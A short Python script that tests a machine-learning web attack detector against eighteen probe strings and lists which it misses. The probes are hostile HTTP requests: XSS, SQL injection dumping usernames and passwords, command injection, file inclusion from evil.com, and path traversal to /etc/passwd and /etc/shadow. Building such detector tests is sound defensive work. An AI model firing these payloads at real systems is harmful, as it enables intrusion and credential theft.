import sys
sys.path.insert(0, r"D:\Documents\ML_all_Payloads\Mdefender-Pro\backend")
from src.engine.ml_detector import MLDetector

d = MLDetector()
probes = [
    "GET /search?q=<script>alert(1)</script> HTTP/1.1",
    "GET /index.php?id=1' OR '1'='1 HTTP/1.1",
    "GET /index.php?page=1%20AND%20SLEEP(5) HTTP/1.1",
    "GET /index.php?cmd=ls%20-l HTTP/1.1",
    "POST /login.php user=admin'-- HTTP/1.1",
    "GET /index.php?url=http://evil.com/backdoor.php HTTP/1.1",
    "GET /index.php?file=/etc/passwd HTTP/1.1",
    "GET /download.php?file=../../../../etc/passwd HTTP/1.1",
    "GET /api/user?id=1 UNION SELECT username,password FROM users-- HTTP/1.1",
    "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array HTTP/1.1",
    "GET /index.php?page=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1",
    "GET /wp-admin/admin-ajax.php?action=filemanager&cmd=write HTTP/1.1",
    "GET /index.php?page=../../etc/shadow HTTP/1.1",
    "GET /cat/?search=%00 HTTP/1.1",
    "GET /old/../old/../../../../../etc/passwd HTTP/1.1",
    "POST /submit.php Content-Type: application/x-www-form-urlencoded name=%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "GET /index.php?title=<svg/onload=alert(1)> HTTP/1.1",
    "GET /?redirect=http://evil.com HTTP/1.1",
]
missed = []
for p in probes:
    r = d.detect(p)
    flag = "HIT " if r["prediction"] == 1 else "MISS"
    if r["prediction"] == 0:
        missed.append((p, r["probability"]))
    print(f"{flag} {r['probability']:.4f}  {r['category'] or '-':<22} {p}")
print("\nMISSED:", len(missed))
for p, prob in missed:
    print("  ", f"{prob:.4f}", p)
